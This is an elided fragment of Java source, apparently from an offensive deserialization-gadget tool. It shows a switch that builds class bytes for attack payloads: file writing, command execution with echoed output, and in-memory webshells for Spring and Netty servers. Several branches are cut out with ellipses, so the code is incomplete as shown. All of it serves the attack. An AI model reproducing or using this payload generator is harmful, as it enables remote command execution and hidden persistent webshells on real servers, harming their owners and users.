package com.aurora.Gadgets.utils;
...
//        clazz.setSuperclass(superC);
        ...
        switch (type){
            case putfile:
                PutfileTemplate putfileTemplate = new PutfileTemplate(param[0],param[1]);
                classBytes = putfileTemplate.getBytes();
                break;
            case commandecho:
                CommandEchoTemplate commandEchoTemplate = new CommandEchoTemplate(param[0],param[1]);
                classBytes = commandEchoTemplate.getBytes();
                break;
            case command:
            ...
            case springmemshell:
                ...
                break;
            case springmemshell2:
                classBytes = Cache.get("SpringMemshellTemplate2");
                break;
            case nettymeshell:
                classBytes = Cache.get("NettyMemshellTemplate");
                break;
        }
